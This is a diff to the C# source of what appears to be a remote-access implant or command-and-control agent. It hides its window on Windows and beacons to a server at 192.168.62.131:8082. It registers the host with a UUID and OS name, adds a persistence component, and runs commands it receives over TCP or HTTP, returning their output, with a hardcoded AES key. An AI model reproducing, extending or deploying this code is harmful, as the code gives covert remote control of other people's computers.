@@ -16,23 +16,19 @@ using cevsn.encrn.rsa;
 using cevsn.encrn;
 using System.Runtime.InteropServices;
 
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
 namespace cevsn
 {
     public class Cevsn
     {
         //Windows hide Console
-        [DllImport("kernel32.dll", EntryPoint = "GetStdHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static extern IntPtr GetStdHandle(int nStdHandle);
-
-        [DllImport("kernel32.dll", EntryPoint = "AllocConsole", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static extern int AllocConsole();
-
-        private const int STD_OUTPUT_HANDLE = -11;
-        private const int MY_CODE_PAGE = 437;
-        private static bool showConsole = true;
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
 
-        public static String URL = "http://127.0.0.1:8082/initialRSA.txt";
+        public static String URL = "http://192.168.62.131:8082/initialRSA.txt";
         public static String UUID = Guid.NewGuid().ToString();
         public volatile static byte[] iv = new byte[16];
         public volatile static string Key = "";
@@ -52,13 +48,20 @@ namespace cevsn
         public volatile static Boolean first = false;
         public volatile static int counter = 0;
         public volatile static Boolean firstHTTP = false;
+        public volatile static Pevsn? Persist = null;
 
         public volatile static string cont = "";
         public volatile static Boolean gotHostInformation = false;
+        public volatile static string osName = "";
 
         public static async Task Main(string[] args)
         {
-
+            osName = getOsName();
+            if(osName.Contains("Windows"))
+            {
+                IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
+                ShowWindow(h, 0);
+            }
             gotHostInformation = false;
             Running = true;
 
@@ -68,11 +71,11 @@ namespace cevsn
                 {
                     while(gotHostInformation == false)
                     {
-                        URL = "http://127.0.0.1:8082/"+UUID+".txt";
+                        URL = "http://192.168.62.131:8082/"+UUID+".txt";
                         cont = getContent();
                         if(cont == "")
                         {
-                            URL = URL = "http://127.0.0.1:8082/initialRSA.txt";
+                            URL = "http://192.168.62.131:8082/initialRSA.txt";
                             Update();
                         } else {
                             parseHostInformation(cont);
@@ -92,7 +95,7 @@ namespace cevsn
                             Console.Write("Trying to connect to TCP...\n");
                             if(checker == false)
                             {
-                                tevsn = CreateTevsn(IP, PORT, Key, getOsName());
+                                tevsn = CreateTevsn(IP, PORT, Key, osName);
                                 tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
                                 checker = true;
                             }
@@ -100,6 +103,10 @@ namespace cevsn
                             {
                                 Console.Write("connected\n");
                                 IsConnected = tevsn.IsConnected();
+                                if(osName.Contains("Windows"))
+                                {
+                                    Persist = new Pevsn();
+                                }
                                 while(IsConnected)
                                 {
                                     if(!first)
@@ -107,8 +114,8 @@ namespace cevsn
                                         try
                                         {
                                             Console.Write("Sending to Server first Conn!\n");
-                                            tevsn.Send(UUID + ": just arrived to vacation on: " + getOsName());
-                                            URL = "http://127.0.0.1:8082/"+UUID+".txt";
+                                            tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
+                                            URL = "http://"+IP+":8082/"+UUID+".txt";
                                             Thread.Sleep(5000);
                                             try
                                             {
@@ -119,10 +126,10 @@ namespace cevsn
                                             }
                                             string recv1 = tevsn.Receive();
                                             if (recv1.Equals("reviveTime")) {
-                                                tevsn.Fallback();
                                                 IsConnected = tevsn.IsConnected();
                                                 if(!IsConnected)
                                                 {
+                                                    tevsn.Fallback();
                                                     first = false;
                                                     break;
                                                 }
@@ -130,6 +137,7 @@ namespace cevsn
                                                 tevsn.Send("keepalive");
                                             } else if (recv1.Equals("httpSw")) {
                                                 Type = "HTTP";
+                                                firstHTTP = false;
                                                 Update();
                                                 tevsn.Disconnect();
                                                 break;
@@ -148,14 +156,14 @@ namespace cevsn
                                             }
                                         }
                                     } else {
-                                        Console.Write("Waiting" + "\n");
+                                        Console.Write("\nWaiting\n");
                                         string recv = tevsn.Receive();
                                         Console.Write(recv);
                                         if (recv.Equals("reviveTime")) {
-                                            tevsn.Fallback();
                                             IsConnected = tevsn.IsConnected();
                                             if(!IsConnected)
                                             {
+                                                tevsn.Fallback();
                                                 first = false;
                                                 break;
                                             }
@@ -163,8 +171,10 @@ namespace cevsn
                                             tevsn.Send("keepalive");
                                         } else if (recv.Equals("httpSw")) {
                                             Type = "HTTP";
+                                            firstHTTP = false;
                                             Update();
                                             tevsn.Disconnect();
+                                            tevsn = null;
                                             break;
                                         } else {
                                             tevsn.Send(tevsn.exec(recv));
@@ -176,26 +186,43 @@ namespace cevsn
                         }
                         if(Type.Equals("HTTP"))
                         {
-                            //hevsn = new Hevsn("http://127.0.0.1:8082:"+PORT+"/lit", rsa!);
-                            if(!firstHTTP)
-                            {
-                                hevsn = new Hevsn("http://127.0.0.1:"+PORT+"/lit", aes!);
-                                hevsn.sendInit();
-                                firstHTTP = true;
-                            }
                             while(Type.Equals("HTTP"))
                             {
-
-                                hevsn!.getCommands("give");
-                                if(hevsn.getCommand().Length > 1)
+                            //hevsn = new Hevsn("http://192.168.62.131:8082:"+PORT+"/lit", rsa!);
+                                if(!firstHTTP)
                                 {
-                                    string comm = hevsn.getCommand();
-                                    if(!comm.Equals(""))
-                                    {
-                                        hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
-                                    }
+                                    aes = new AES("lol123", iv);
+                                    hevsn = new Hevsn("http://"+IP+":"+PORT+"/lit", aes);
+                                    Thread.Sleep(2000);
+                                    hevsn.sendInit();
+                                    firstHTTP = true;
                                 }
-                                Thread.Sleep(3000);
+                                try
+                                {
+                                    hevsn!.getCommands("give");
+                                    if(hevsn.getCommand().Length > 1)
+                                    {
+                                        string comm = hevsn.getCommand();
+                                        if(!comm.Equals("") && comm.Length >= 2)
+                                        {
+                                            if (comm.Equals("tcpSw")) 
+                                            {
+                                                Type = "TCP";
+                                                checker = false;
+                                                Update();
+                                                first = false;
+                                                hevsn = null;
+                                            } else if(comm.Equals("httpSw")) {
+                                                firstHTTP = false;
+                                            } else {
+                                                hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
+                                            }
+                                        }
+                                    }
+                                    Thread.Sleep(3000);
+                                } catch (NullReferenceException) {
+                                    firstHTTP = false;
+                                }
                             }
                         }
                         counter++;
